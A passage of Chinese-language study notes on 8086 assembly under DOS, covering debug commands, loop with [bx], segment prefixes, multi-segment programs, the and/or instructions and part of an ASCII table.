class="line">ds的地址不能乱选，我之前用段地址f000和ffff都不能写入数据</span><br></pre></td></tr></table></figure></li><li><p>编译连接，debug调试，先个f000：0006的内存单元赋值我就赋 <code>1</code></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719165301124.png" alt="image-20240719165301124"></p><p>先使用 <code>t</code>调试，之后<strong>有两种方式退出循环</strong></p><p><strong>（1）新指令 <code>g</code>调试</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g 偏移地址//debug中的指令运行到内存指定位置的代码后暂停</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719165639768.png" alt="image-20240719165639768"></p></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719165703454.png" alt="image-20240719165703454"></p><p>成功</p><p><strong>（2）用指令 <code>p</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p命令也称为（步进命令）允许用户逐步执行程序，但与t命令（步入命令）不同，p命令在遇到函数调用时不会进入函数内部，而是直接执行完整个函数调用，这有助于快速跳过某些不需要详细检查的代码段</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719170310592.png" alt="image-20240719170310592"></p><h3 id="5-4-debug和汇编编译器masm对指令的不同处理"><a href="#5-4-debug和汇编编译器masm对指令的不同处理" class="headerlink" title="5.4 debug和汇编编译器masm对指令的不同处理"></a>5.4 debug和汇编编译器masm对指令的不同处理</h3><p><strong>区别</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在debug中编写代码[...]可直接被识别为单元内存</span><br><span class="line">在masm中编写代码[...]会被识别为...，可以通过bx作为媒介，如mov bx，1H   mov ax，[bx],也可以加上段地址，如，mov al，ds：[...]才能被正常的识别为内存单元</span><br></pre></td></tr></table></figure><h3 id="5-5-loop和-bx-的联合应用"><a href="#5-5-loop和-bx-的联合应用" class="headerlink" title="5.5 loop和[bx]的联合应用"></a>5.5 loop和[bx]的联合应用</h3><p><strong>问题</strong></p><p>如何对8位的数据进行累加，若直接使用内存单元的话，虽然内存单元是8位的但是当其赋值或加给寄存器的时候我自动带上下一个内存单元给寄存器赋值，但是如果用如 <code>al</code>或 <code>ah</code>的话又会有存不下的可能</p><p><strong>所以</strong>，我们要用一个 <code>al</code>接收数据，再把它加给一个16位的寄存器</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719212738563.png" alt="image-20240719212738563"></p><p>但这样写代码又太长了</p><p>这时就需要我们用 <code>loop</code>和 <code>[bx]</code>来解决问题了</p><ol><li>程序实现</li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719214506456.png" alt="image-20240719214506456"></p><p>我试了下面这种也行我觉得把 <code>ah</code>放上去还要好一点</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719215345848.png" alt="image-20240719215345848"></p><ol start="2"><li>编译连接，debug调试，修改2000：0~12的数据</li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719214609109.png" alt="image-20240719214609109"></p><p>成功</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719215117158.png" alt="image-20240719215117158"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719215150779.png" alt="image-20240719215150779"></p><h3 id="5-6-段前缀"><a href="#5-6-段前缀" class="headerlink" title="5.6 段前缀"></a>5.6 段前缀</h3><ul><li><p>指令“mov ax,[bx]”中，内存单元的偏移地址由bx给出，而段地址默认在ds中</p></li><li><p>我们可以在访问内存单元的指令中显式地给出内存单元的段地址所在的段寄存器</p></li><li><p>这些出现在访问内存单元的指令中，用于显式地指明内存单元的段地址的“ds：”，“cs：”，“ss：”或“es：”，在汇编语言中称为段前缀</p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,cs:[...]</span><br><span class="line">mov bx,es:[...]</span><br></pre></td></tr></table></figure></li><li><p>没有段前缀默认为 <code>ds:</code></p></li></ul><h3 id="5-7-一段安全的空间"><a href="#5-7-一段安全的空间" class="headerlink" title="5.7 一段安全的空间"></a>5.7 一段安全的空间</h3><ul><li><p>在8086模式中，任意向一段内存空间写入内容是很危险的，因为这段空间中可能存放着重要的系统数据或代码</p></li><li><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax，1000h</span><br><span class="line">mov ds，ax</span><br><span class="line">mov al，0</span><br><span class="line">mov ds:[0],al</span><br></pre></td></tr></table></figure></li><li><p>我们来试试</p><ol><li><p>先编写程序</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240720001815194.png" alt="image-20240720001815194"></p></li><li><p>编译连接，debug调试，系统卡死</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240720001924518.png" alt="image-20240720001924518"></p></li></ol></li><li><p>在操作系统的环境中工作，操作系统管理所有的资源，也包括内存</p></li><li><p>通过汇编语言获得底层的编程体验，理解计算机计算机底层的基本工作机理</p></li></ul><p>注意</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们在纯DOS方式（实模式）下，可以不理会DOS，直接用汇编语言去操作真实的硬件，因为运行在cpu实模式下的dos，没有能力对操作系统进行全面，严格地管理，同时也很容易对系统造成伤害，但在Windows XP\2000、UNIX这些运行于CPU保护模式下的操作系统中，不理会操作系统，用汇编语言去操作真实的硬件，是根本不可能的。硬件已被这些操作系统利用CPU保护模式所提供的功能全面而严格地管理了。</span><br></pre></td></tr></table></figure><ul><li>在一般的PC机中，DOS方式下，DOS和其他合法的程序一般都不会使用0:200<del>0:2FF(0:200h</del>0:2FFh)的256个字节的空间。所以，我们使用这段空间是安全的。</li></ul><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240720130133516.png" alt="image-20240720130133516"></p><h3 id="5-8-段前缀的使用"><a href="#5-8-段前缀的使用" class="headerlink" title="5.8 段前缀的使用"></a>5.8 段前缀的使用</h3><p><strong>问题</strong></p><p>如果我们需要将一段内存单元的数据放到另一段内存单元中可以怎么处理</p><p>可以这么处理</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240720170103638.png" alt="image-20240720170103638"></p><p>但是这么处理明显效率低下</p><p>这时我们就可以引用附加段寄存器 <code>es</code></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240720170709909.png" alt="image-20240720170709909"></p><h2 id="6-包括多个段的程序"><a href="#6-包括多个段的程序" class="headerlink" title="6 包括多个段的程序"></a>6 包括多个段的程序</h2><h3 id="6-1-在代码段中使用数据举例"><a href="#6-1-在代码段中使用数据举例" class="headerlink" title="6.1 在代码段中使用数据举例"></a>6.1 在代码段中使用数据举例</h3><p><strong>dw</strong></p><p>定义字型数据，define word，类推，定义字节型数据 <code>db  define byte </code></p><p>使用 <code>dw</code>时数据间用<strong>逗号</strong>隔开</p><p><strong>小实验</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240720174138156.png" alt="image-20240720174138156"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240720174127981.png" alt="image-20240720174127981"></p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240720174345365.png" alt="image-20240720174345365"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240720174506450.png" alt="image-20240720174506450"></p><p>我们发现 <code>dw</code>写入的数据是直接接着代码写入内存单元的，并没有重新找个地址，这种就会出现cpu误将数据当成指令读的情况</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240720175107222.png" alt="image-20240720175107222"></p><p>为了避免cpu误读取指令，我们可以选择在真正指令开始的地方和最后 <code>end</code> 加上一个 <strong>标号</strong>表示开始</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240720175336114.png" alt="image-20240720175336114"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">end</span><br><span class="line">除了通知编译器程序结束外，还可以通知编译器程序的入口在什么地方</span><br></pre></td></tr></table></figure><h3 id="6-2-在代码段中使用栈"><a href="#6-2-在代码段中使用栈" class="headerlink" title="6.2 在代码段中使用栈"></a>6.2 在代码段中使用栈</h3><p>栈的地址是我们自己定的，同样我们也不能随便将他放在内存的任意地址，这时我们就可以利用6.1讲过的 <code>dw</code>来为我们定义一个栈空间</p><p><strong>演示</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240720181846769.png" alt="image-20240720181846769"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240720182346945.png" alt="image-20240720182346945"></p><p>经过一系列的 <code>p</code>后</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240720182458172.png" alt="image-20240720182458172"></p><p>成功将<code>076a:0 f</code>的数据按字倒转</p><h3 id="6-3-将数据，代码，栈放入不同的段"><a href="#6-3-将数据，代码，栈放入不同的段" class="headerlink" title="6.3 将数据，代码，栈放入不同的段"></a>6.3 将数据，代码，栈放入不同的段</h3><p>在编程的过程中我们将数据，栈和代码都放在一个段中，我们在编程的时候要注意何处是数据，何处是栈，何处是代码</p><p>这时就存在两个问题</p><ol><li>把他们放在一个段中使程序显得混乱</li><li>前面程序中处理的数据很少，用到的栈空间也小，加上没有多长的代码，放到一个段里面没有问题</li></ol><ul><li>但如果数据、栈和代码需要的空间超过64KB，就不能放在一个段中(一个段的容量不能大于64KB，是我们在学习中所用的8086模式的限制，并不是所有的处理器都这样)中</li></ul><p><strong>如何创建多个段呢</strong></p><ol><li>首先我们要定义段</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assume cs:a,ds:b,ss:c//这个不慌学，后面应该会仔细讲一次</span><br><span class="line">//如果你不使用段中的变量名，可以不关联这个段的段名与寄存器。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume语句，是伪指令，仅仅是写给编译软件的。编译软件，并不把它生成机器码。</span><br><span class="line"></span><br><span class="line">assume对除了CS以外的其它段寄存器，仅仅只是关联了段名，以便在访问段内变量（目前还没学）时程序可以知道用哪个段寄存器，并没有在程序加载时将段地址装入段寄存器。</span><br><span class="line"></span><br><span class="line">所以，将段地址装入段寄存器的工作，必须由用户在程序中自己编写代码，并在程序开始运行时执行代码完成装入工作。</span><br><span class="line">仅仅对CS段寄存器，会在关联段名的同时，在程序加载时自动将段地址装入段寄存器。</span><br></pre></td></tr></table></figure><ol start="2"><li>我们要给段写入信息</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">b segment</span><br><span class="line">dw shuju,shuju,shuju,shuju,shuju,shuju,shuju,shuju,shuju</span><br><span class="line">b ends</span><br><span class="line"></span><br><span class="line">c segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0</span><br><span class="line">c ends</span><br><span class="line"></span><br><span class="line">a segment</span><br><span class="line">d: mov ax,b//b和下面的c表示的是数据段，栈段的地址</span><br><span class="line">   mov ds,ax//不能直接给段寄存器赋值</span><br><span class="line">   mov ax,c</span><br><span class="line">   mov ss,ax</span><br><span class="line">   mov sp,16</span><br><span class="line">a ends</span><br><span class="line">end d//d用于给编译器识别代码的开始，将开始地址赋值给cs：ip</span><br></pre></td></tr></table></figure><p><strong>问题</strong></p><ol><li><strong>每个段都有不同的段地址吗？</strong></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721003450600.png" alt="image-20240721003450600"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721003532121.png" alt="image-20240721003532121"></p><p>我们发现数据段的段地址是代码段段地址减2，栈段的段地址是代码段段地址减1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">汇编语言中不同的段确实有不同的段地址。</span><br><span class="line"></span><br><span class="line">在汇编语言中，程序内存地址被分为若干逻辑段，每个逻辑段的起始地址称为段地址。这些段包括数据段，代码段和栈段等，每个段都有其特定的用途和功能。例如，数据段用于存储程序的数据，代码段用于存储程序的指令，而栈段则用于存储局部变量和函数调用的信息。每个段都有其独立的段地址，这些地址在程序执行时用于定位到相应的数据或指令。</span><br><span class="line"></span><br><span class="line">此外，每个段的最大占用空间为64KB，但最小分配空间是16个字节，并且总是以16的倍数来分配空间。如果段里面没有定义任何数据，则不分配空间。这意味着，虽然每个段都有其特定的用途和地址，但它们的实际内存占用是根据需要动态分配的。（假如字节数有N个，占用的空间就是（16*（N/16+1））</span><br><span class="line"></span><br><span class="line">逻辑地址由段地址和偏移地址两部分组成，其中段地址指出是哪一段，而偏移地址标明是段中的哪一个单元。这种分段机制使得CPU能够有效地管理内存，尤其是在处理大量数据时，可以更加灵活地分配和管理内存资源。</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>如果不加 d （start：表示代码的开始）有多个段的代码还能运行吗？</strong></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721003803175.png" alt="image-20240721003803175"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721003752494.png" alt="image-20240721003752494"></p><p>我们发现找不到入口，当然这些都是基于数据和栈比较小的情况下</p><ol start="3"><li><strong>如果代码段在最前面呢？</strong></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721011221348.png" alt="image-20240721011221348"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721011302015.png" alt="image-20240721011302015"></p><p>我们发现数据段和栈段的段寄存器地址跑到后面去了，我们发现数据段的段地址是代码段段地址加2，栈段的段地址是代码段段地址加3</p><ol start="4"><li><strong>代码段在前面的时候不加d会怎么样</strong></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721011605890.png" alt="image-20240721011605890"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721011615611.png" alt="image-20240721011615611"></p><p>这次我们发现程序可以运行</p><h2 id="7-更灵活的定位内存地址的方法"><a href="#7-更灵活的定位内存地址的方法" class="headerlink" title="7 更灵活的定位内存地址的方法"></a>7 更灵活的定位内存地址的方法</h2><h3 id="7-1-and和or指令"><a href="#7-1-and和or指令" class="headerlink" title="7.1 and和or指令"></a>7.1 and和or指令</h3><p><strong>and</strong></p><p>and指令：逻辑与指令，按位进行与运算</p><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov al，01100011B</span><br><span class="line">and al，00111011B</span><br><span class="line">执行后al=00100011B</span><br><span class="line">0 and 0=0</span><br><span class="line">0 and 1=0</span><br><span class="line">1 and 0=0</span><br><span class="line">1 and 1=1</span><br></pre></td></tr></table></figure><p><strong>and的功能</strong></p><ol><li><p>通过该指令可将操作对象的相应位设为0，其他位不变</p><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将al的第6位设为0：and al，10111111B</span><br><span class="line">将al的第7位设为0：and al，01111111B</span><br><span class="line">以此类推</span><br></pre></td></tr></table></figure></li></ol><p><strong>or</strong></p><p>or指令：逻辑或指令，按位进行或运算</p><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  mov al，01100011B</span><br><span class="line">   or al，00111011B</span><br><span class="line">执行后：al=01111011B</span><br><span class="line">0 or 0=0</span><br><span class="line">0 or 1=1</span><br><span class="line">1 or 0=1</span><br><span class="line">1 or 1=1</span><br></pre></td></tr></table></figure><p><strong>or的功能</strong></p><ol><li>通过该指令可将操作对象的相应位设为1，其他位不变</li></ol><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将al的第6位设为1：or al，01000000B</span><br><span class="line">将al的第7位设为1：or al，10000000B</span><br><span class="line">以此类推</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><p>and和or都不能直接对内存单元使用，必须有寄存器作为媒介</p><h3 id="7-2-关于ASCII码"><a href="#7-2-关于ASCII码" class="headerlink" title="7.2 关于ASCII码"></a>7.2 关于ASCII码</h3><ul><li>世界上有很多编码方案，有种方案叫做ASCII编码，是在计算机系统中通常被采用的</li><li>ASCII码表</li></ul><table><thead><tr><th>Bin(二进制)</th><th>Oct(八进制)</th><th>Dec(十进制)</th><th>Hex(十六进制)</th><th>缩写&#x2F;字符</th><th>解释</th></tr></thead><tbody><tr><td>0000 0000</td><td>00</td><td>0</td><td>0x00</td><td>NUL(null)</td><td>空字符</td></tr><tr><td>0000 0001</td><td>01</td><td>1</td><td>0x01</td><td>SOH(start of headline)</td><td>标题开始</td></tr><tr><td>0000 0010</td><td>02</td><td>2</td><td>0x02</td><td>STX (start of text)</td><td>正文开始</td></tr><tr><td>0000 0011</td><td>03</td><td>3</td><td>0x03</td><td>ETX (end of text)</td><td>正文结束</td></tr><tr><td>0000 0100</td><td>04</td><td>4</td><td>0x04</td><td>EOT (end of transmission)</td><td>传输结束</td></tr><tr><td>0000 0101</td><td>05</td><td>5</td><td>0x05</td><td>ENQ (enquiry)</td><td>请求</td></tr><tr><td>0000 0110</td><td>06</td><td>6</td><td>0x06</td><td>ACK (acknowledge)</td><td>收到通知</td></tr><tr><td>0000 0111</td><td>07</td><td>7</td><td>0x07</td><td>BEL (bell)</td><td>响铃</td></tr><tr><td>0000 1000</td><td>010</td><td>8</td><td>0x08</td><td>BS (backspace)</td><td>退格</td></tr><tr><td>0000 1001</td><td>011</td><td>9</td><td>0x09</td><td>HT (horizontal tab)</td><td>水平制表符</td></tr><tr><td>0000 1010</td><td>012</td><td>10</td><td>0x0A</td><td>LF (NL line feed, new line)</td><td>换行键</td></tr><tr><td>0000 1011</td><td>013</td><td>11</td><td>0x0B</td><td>VT (vertical tab)</td><td>垂直制表符</td></tr><tr><td>0000 1100</td><td>014</td><td>12</td><td>0x0C</td><td>FF (NP form feed, new page)</td><td>换页键</td></tr><tr><td>0000 1101</td><td>015</td><td>13</td><td>0x0D</td><td>CR (carriage return)</td><td>回车键</td></tr><tr><td>0000 1110</td><td>016</td><td>14</td><td>0x0E</td><td>SO (shift out)</td><td>不用切换</td></tr><tr><td>0000 1111</td><td>017</td><td>15</td><td>0x0F</td><td>SI (shift in)</td><td>启用切换</td></tr><tr><td>0001 0000</td><td>020</td><td>16</td><td>0x10</td><td>DLE (data link escape)</td><td>数据链路转义</td></tr><tr><td>0001 0001</td><td>021</td><td>17</td><td>0x11</td><td>DC1 (device control 1)</td><td>设备控制1</td></tr><tr><td>0001 0010</td><td>022</td><td>18</td><td>0x12</td><td>DC2 (device control 2)</td><td>设备控制2</td></tr><tr><td>0001 0011</td><td>023</td><td>19</td><td>0x13</td><td>DC3 (device control 3)</td><td>设备控制3</td></tr><tr><td>0001 0100</td><td>024</td><td>20</td><td>0x14</td><td>DC4 (device control 4)</td><td>设备控制4</td></tr><tr><td>0001 0101</td><td>025</td><td>21</td><td>0x15</td><td>NAK (negative acknowledge)</td><td>拒绝接收</td></tr><tr><td>0001 0110</td><td>026</td><td>22</td><td>0x16</td><td>SYN (synchronous idle)</td><td>同步空闲</td></tr><tr><td>0001 0111</td><td>027</td><td>23</td><td>0x17</td><td>ETB (end of trans. block)</td><td>结束传输块</td></tr><tr><td>0001 1000</td><td>030</td><td>24</td><td>0x18</td><td>CAN (cancel)</td><td>取消</td></tr><tr><td>0001 1001</td><td>031</td><td>25</td><td>0x19</td><td>EM (end of medium)</td><td>媒介结束</td></tr><tr><td>0001 1010</td><td>032</td><td>26</td><td>0x1A</td><td>SUB (substitute)</td><td>代替</td></tr><tr><td>0001 1011</td><td>033</td><td>27</td><td>0x1B</td><td>ESC (escape)</td><td>换码(溢出)</td></tr><tr><td>0001 1100</td><td>034</td><td>28</td><td>0x1C</td><td>FS (file separator)</td><td>文件分隔符</td></tr><tr><td>0001 1101</td><td>035</td><td>29</td><td>0x1D</td><td>GS (group separator)</td><td>分组符</td></tr><tr><td>0001 1110</td><td>036</td><td>30</td><td>0x1E</td><td>RS (record separator)</td><td>记录分隔符</td></tr><tr><td>0001 1111</td><td>037</td><td>31</td><td>0x1F</td><td>US (unit separator)</td><td>单元分隔符</td></tr><tr><td>0010 0000</td><td>040</td><td>32</td><td>0x20</td><td>(space)</td><td>空格</td></tr><tr><td>0010 0001</td><td>041</td><td>33</td><td>0x21</td><td>!</td><td>叹号</td></tr><tr><td>0010 0010</td><td>042</td><td>34</td><td>0x22</td><td>“</td><td>双引号</td></tr><tr><td>0010 0011</td><td>043</td><td>35</td><td>0x23</td><td>#</td><td>井号</td></tr><tr><td>0010 0100</td><td>044</td><td>36</td><td>0x24</td><td>$</td><td>美元符</td></tr><tr><td>0010 0101</td><td>045</td><td>37</td><td>0x25</td><td>%</td><td>百分号</td></tr><tr><td>0010 0110</td><td>046</td><td>38</td><td>0x26</td><td>&amp;</td><td>和号</td></tr><tr><td>0010 0111</td><td>047</td><td>39</td><td>0x27</td><td>‘</td><td>单引号</td></tr><tr><td>0010 1000</td><td>050</td><td>40</td><td>0x28</td><td>(</td><td>开括号</td></tr><tr><td>0010 1001</td><td>051</td><td>41</td><td>0x29</td><td>)</td><td>闭括号</td></tr><tr><td>0010 1010</td><td>052</td><td>42</td><td>0x2A</td><td>*</td><td>星号</td></tr><tr><td>0010 1011</td><td>053</td><td>43</td><td>0x2B</td><td>+</td><td>加号</td></tr><tr><td>0010 1100</td><td>054</td><td>44</td><td>0x2C</td><td>,</td><td>逗号</td></tr><tr><td>0010 1101</td><td>055</td><td>45</td><td>0x2D</td><td>-</td><td>减号&#x2F;破折号</td></tr><tr><td>0010 1110</td><td>056</td><td>46</td><td>0x2E</td><td>.</td><td>句号</td></tr><tr><td>0010 1111</td><td>057</td><td>47</td><td>0x2F</td><td>&#x2F;</td><td>斜杠</td></tr><tr><td>0011 0000</td><td>060</td><td>48</td><td>0x30</td><td>0</td><td>字符0</td></tr><tr><td>0011 0001</td><td>061</td><td>49</td><td>0x31</td><td>1</td><td>字符1</td></tr><tr><td>0011 0010</td><td>062</td><td>50</td><td>0x32</td><td>2</td><td>字符2</td></tr><tr><td>0011 0011</td><td>063</td><td>51</td><td>0x33</td><td>3</td><td>字符3</td></tr><tr><td>0011 0100</td><td>064</td><td>52</td><td>0x34</td><td>4</td><td>字符4</td></tr><tr><td>0011 0101</td><td>065</td><td>53</td><td>0x35</td><td>5</td><td>字符5</td></tr><tr><td>0011 0110</td><td>066</td><td>54</td><td>0x36</td><td>6</td><td>字符6</td></tr><tr><td>0011 0111</td><td>067</td><td>55</td><td>0x37</td><td>7</td><td>字符7</td></tr><tr><td>0011 1000</td><td>070</td><td>56</td><td>0x38</td><td>8</td><td>字符8</td></tr><tr><td>0011 1001</td><td>071</td><td>57</td><td>0x39</td><td>9</td><td>字符9</td></tr><tr><td>0011 1010</td><td>072</td><td>58</td><td>0x3A</td><td>:</td><td>冒号</td></tr><tr><td>0011 1011</td><td>073</td><td>59</td><td>0x3B</td><td>;</td><td>分号</td></tr><tr><td>0011 1100</td><td>074</td><td>60</td><td>0x3C</td><td>&lt;</td><td>小于</td></tr><tr><td>0011 1101</td><td>075</td><td>61</td><td>0x3D</td><td>&#x3D;</td><td>等号</td></tr><tr><td>0011 1110</td><td>076</td><td>62</td><td>0x3E</td><td>&gt;</td><td>大于</td></tr><tr><td>0011 1111</td><td>077</td><td>63</td><td>0x3F</td><td>?</td><td>问号</td></tr><tr><td>0100 0000</td><td>0100</td><td>64</td><td>0x40</td><td>@</td><td>电子邮件符号</td></tr><tr><td>0100 0001</td><td>0101</td><td>65</td><td>0x41</td><td>A</td><td>大写字母A</td></tr><tr><td>0100 0010</td><td>0102</td><td>66</td><td>0x42</td><td>B</td><td>大写字母B</td></tr><tr><td>0100 0011</td><td>0103</td><td>67</td><td>0x43</td><td>C</td><td>大写字母C</td></tr><tr><td>0100 0100</td><td>0104</td><td>68</td><td>0x44</td><td>D</td><td>大写字母D</td></tr><tr><td>0100 0101</td><td>0105</td><td>69</td><td>0x45</td><td>E</td><td>大写字母E</td></tr><tr><td>0100 0110</td><td>0106</td><td>70</td><td>0x46</td><td>F</td><td>大写字母F</td></tr><tr><td>0100 0111</td><td>0107</td><td>71</td><td>0x47</td><td>G</td><td>大写字母G</td></tr><tr><td>0100 1000</td><td>0110</td><td>72</td><td>0x48</td><td>H</td><td>大写字母H</td></tr><tr><td>0100 1001</td><td>0111</td><td>73</td><td>0x49</td><td>I</td><td>大写字母I</td></tr><tr><td>01001010</td><td>0112</td><td>74</td><td>0x4A</td><td>J</td><td>大写字母J</td></tr><tr><td>0100 1011</td><td>0113</td><td>75</td><td>0x4B</td><td>K</td><td>大写字母K</td></tr><tr><td>0100 1100</td><td>0114</td><td>76</td><td>0x4C</td><td>L</td><td>大写字母L</td></tr><tr><td>0100 1101</td><td>0115</td><td>77</td><td>0x4D</td><td>M</td><td>大写字母M</td></tr><tr><td>0100 1110</td><td>0116</td><td>78</td><td>0x4E</td><td>N</td><td>大写字母N</td></tr><tr><td>0100 1111</td><td>0117</td><td>79</td><td>0x4F</td><td>O</td><td>大写字母O</td></tr><tr><td>0101 0000</td><td>0120</td><td>80</td><td>0x50</td><td>P</td><td>大写字母P</td></tr><tr><td>0101 0001</td><td>0121</td><td>81</td><td>0x51</td><td>Q</td><td>大写字母Q</td></tr><tr><td>0101 0010</td><td>0122</td><td>82</td><td>0x52</td><td>R</td><td>大写字母R</td></tr><tr><td>0101 0011</td><td>0123</td><td>83</td><td>0x53</td><td>S</td><td>大写字母S</td></tr><tr><td>0101 0100</td><td>0124</td><td>84</td><td>0x54</td><td>T</td><td>大写字母T</td></tr><tr><td>0101 0101</td><td>0125</td><td>85</td><td>0x55</td><td>U</td><td>大写字母U</td></tr><tr><td>0101 0110</td><td>0126</td><td>86</td><td>0x56</td><td>V</td><td>大写字母V</td></tr><tr><td>0101 0111</td><td>0127</td><td>87</td><td>0x57</td><td>W</td><td>大写字母W</td></tr><tr><td>0101 1000</td><td>0130</td><td>88</td><td>0x58</td><td>X</td><td>大写字母X</td></tr><tr><td>0101 1001</td><td>0131</td><td>89</td><td>0x59</td><td>Y</td><td>大写字母Y</td></tr><tr><td>0101 1010</td><td>0132</td><td>90</td><td>0x5A</td><td>Z</td><td>大写字母Z</td></tr><tr><td>0101 1011</td><td>0133</td><td>91</td><td>0x5B</td><td>[</td><td>开方括号</td></tr><tr><td>0101 1100</td><td>0134</td><td>92</td><td>0x5C</td><td>\</td><td>反斜杠</td></tr><tr><td>0101 1101</td><td>0135</td><td>93</td><td>0x5D</td><td>]</td><td>闭方括号</td></tr><tr><td>0101 1110</td><td>0136</td><td>94</td><td>0x5E</td><td>^</td><td>脱字符</td></tr><tr><td>0101 1111</td><td>0137</td><td>95</td><td>0x5F</td><td>_</td><td>下划线</td></tr><tr><td>0110 0000</td><td>0140</td><td>96</td><td>0x60</td><td>&#96;</td><td>开单引号</td></tr><tr><td>0110 0001</td><td>0141</td><td>97</td><td>0x61</td><td>a</td><td>小写字母a</td></tr><tr><td>0110 0010</td><td>0142</td><td>98</td><td>0x62</td><td>b</td><td>小写字母b</td></tr><tr><td>0110 0011</td><td>0143</td><td>99</td><td>0x63</td><td>c</td><td>小写字母c</td></tr><tr><td>0110 0100</td><td>0144</td><td>100</td><td>0x64</td><td>d</td><td>小写字母d</td></tr><tr><td>0110 0101</td><td>0145</td><td>101</td><td>0x65</td><td>e</td><td>小写字母e</td></tr><tr><td>0110 0110</td><td>0146</td><td>102</td><td>0x66</td><td>f</td><td>小写字母f</td></tr><tr><td>0110 0111</td><td>0147</td><td>103</td><td>0x67</td><td>g</td><td>小写字母g</td></tr><tr><td>0110 1000</td><td>0150</td><td>104</td><td>0x68</td><td>h</td><td>小写字母h</td></tr><tr><td>0110 1001</td><td>0151</td><td>105</td><td>0x69</td><td>i</td><td>小写字母i</td></tr><tr><td>0110 1010</td><td>0152</td><td>106</td><td>0x6A</td><td>j</td><td>小写字母j</td></tr><tr><td>0110 